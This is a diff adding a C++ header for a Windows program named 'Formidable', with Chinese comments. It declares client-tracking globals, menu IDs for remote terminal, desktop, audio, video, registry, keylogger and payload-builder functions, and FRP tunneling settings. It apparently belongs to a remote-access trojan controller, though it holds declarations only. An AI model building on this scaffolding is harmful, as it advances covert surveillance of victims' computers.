@@ -1,0 +1,102 @@
+﻿#pragma once
+#ifndef GLOBALSTATE_H
+#define GLOBALSTATE_H
+
+#ifndef WIN32_LEAN_AND_MEAN
+#define WIN32_LEAN_AND_MEAN
+#endif
+#include <winsock2.h>
+#include <windows.h>
+#include <map>
+#include <set>
+#include <string>
+#include <memory>
+#include <mutex>
+#include "../Common/ClientTypes.h"
+#include "../Common/NetworkServer.h"
+
+// 全局常量和消息定义
+#define WM_TRAYICON      (WM_USER + 100)
+#define WM_LOC_UPDATE    (WM_USER + 101)
+
+// 控件ID
+#define IDC_LIST_CLIENTS 1001
+#define IDC_LIST_LOGS    1002
+#define IDC_TOOLBAR      1003
+#define IDC_STATUSBAR    1004
+#define IDC_GROUP_TAB    1005
+
+// 菜单/工具栏按钮ID
+#define IDM_TERMINAL     2001
+#define IDM_PROCESS      2002
+#define IDM_WINDOW       2003
+#define IDM_DESKTOP      2004
+#define IDM_FILE         2005
+#define IDM_AUDIO        2006
+#define IDM_VIDEO        2007
+#define IDM_SERVICE      2008
+#define IDM_REGISTRY     2009
+#define IDM_KEYLOGGER    2010
+#define IDM_SETTINGS     2011
+#define IDM_BUILDER      2012
+#define IDM_HELP         2013
+#define IDM_TRAY_STARTUP 2014
+#define IDM_TRAY_RESTART 2015
+#define IDM_TRAY_EXIT    2016
+
+// 全局变量声明
+extern HINSTANCE g_hInstance;
+extern HANDLE g_hInstanceMutex;
+extern HWND g_hMainWnd;
+extern HWND g_hListClients;
+extern HWND g_hListLogs;
+extern HWND g_hToolbar;
+extern HWND g_hStatusBar;
+extern HWND g_hGroupTab;
+extern std::set<std::string> g_GroupList;
+extern std::string g_selectedGroup;
+extern std::map<uint32_t, std::shared_ptr<Formidable::ConnectedClient>> g_Clients;
+extern std::mutex g_ClientsMutex;
+extern uint32_t g_NextClientId;
+extern Formidable::NetworkServer* g_pNetworkServer;
+extern std::map<CONNID, uint32_t> g_ConnIdToClientId;
+extern std::mutex g_ConnIdMapMutex;
+extern std::map<CONNID, std::vector<BYTE>> g_RecvBuffers;
+extern std::mutex g_RecvBufferMutex;
+extern int g_nListenPort;
+
+// 终端专用资源
+extern HFONT g_hTermFont;
+extern HBRUSH g_hTermEditBkBrush;
+
+// 配置结构
+struct ServerSettings {
+    int listenPort;
+    wchar_t szConfigPath[MAX_PATH];
+    
+    // FRP 内网穿透设置
+    bool bEnableFrp;
+    wchar_t szFrpServer[128];
+    int frpServerPort;
+    wchar_t szFrpToken[64];
+    int frpRemotePort;
+    wchar_t szFrpProxyName[64];
+    int frpDownloadPort; // 下载端口
+};
+extern ServerSettings g_Settings;
+
+// 窗口预览图缓存 (HWND -> HBITMAP)
+extern std::map<HWND, HBITMAP> g_WindowPreviews;
+
+// ListView排序信息
+struct ListViewSortInfo {
+    int column;
+    bool ascending;
+    HWND hwndList;
+};
+extern std::map<HWND, ListViewSortInfo> g_SortInfo;
+
+// 排序回调
+int CALLBACK ListViewCompareProc(LPARAM lParam1, LPARAM lParam2, LPARAM lParamSort);
+
+#endif // GLOBALSTATE_H
